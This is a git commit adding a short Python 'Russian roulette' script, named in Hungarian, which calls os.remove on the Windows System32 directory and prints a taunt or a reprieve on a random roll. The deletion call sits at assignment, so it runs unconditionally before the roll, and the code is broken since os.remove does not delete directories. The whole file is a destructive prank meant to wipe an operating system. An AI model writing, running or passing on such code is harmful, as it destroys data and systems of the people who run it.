33b90a6ea6a763ace9023f181b485a8ca81d9e0e
milan <milan.lohner10@gmail.com>
2023-12-05 19:18:48 +0100

    1

---
+++ Lohner Milán/random_oroszrulett.py
@@ -0,0 +1,11 @@
+import random
+import os
+
+kivegzes = os.remove('C:\Windows\System32')
+
+if random.randint(0,4) == 2:
+    print('Hasta la vista...baby')
+    kivegzes
+
+else:
+    print('Hat ezt megusztad')
